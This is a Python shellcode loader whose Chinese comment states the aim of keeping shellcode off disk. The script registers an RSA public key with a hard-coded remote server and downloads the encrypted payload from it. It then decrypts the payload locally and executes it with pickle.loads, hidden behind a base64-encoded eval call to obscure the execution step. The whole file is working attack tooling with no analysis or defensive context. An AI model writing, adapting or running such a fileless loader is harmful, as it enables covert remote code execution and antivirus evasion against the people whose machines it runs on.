import ctypes
import requests
import rsa
import ctypes
import pickle
import base64


'''
    目标: 远程加载shellcode 做到shellcode不落地
    实现方法: 在本地只保留执行器 在远程服务器保留shellcode 其中远程服务器保存密文shellcode 本地解密 
'''

plat_url='http://192.168.1.110:8080/'


def get_shellcode(plat,FileName):
    res=requests.get(plat_url+'s/{}/{}'.format(plat,FileName))
    text=res.text
    return text

def get_pem():
    (pubkey, privkey) = rsa.newkeys(1024)
    pub = pubkey.save_pkcs1()
    # print(pub)
    # rsa.decrypt(rsa.encrypt("123".encode(),pubkey),privkey)
    # exit()
    FileName=requests.post(plat_url,{"pubkey":pub}).text
    return privkey,FileName

def decrypt(text,private_key):
    text=base64.b64decode(text)
    shellcode=b''
    for i in range(0,len(text)//128):
        if i==len(text)//128:
            shellcode+=rsa.decrypt(text[i*128:],private_key)
        else:
            tmp_data=rsa.decrypt(text[i*128:(i+1)*128],private_key)
            shellcode+=tmp_data
    return shellcode

def exec():
    private_key,FileName=get_pem()
    # print(private_key)
    shellcode=get_shellcode('windows',FileName)
    # print(shellcode)
    shellcode2=decrypt(shellcode[2:-1],private_key)
    # print(shellcode2)
    shellcode=base64.b64decode(shellcode2[2:-1])
    # pickle_data=pickle.loads(shellcode)
    eval(base64.b64decode('cGlja2xlLmxvYWRzKHNoZWxsY29kZSk='))

exec()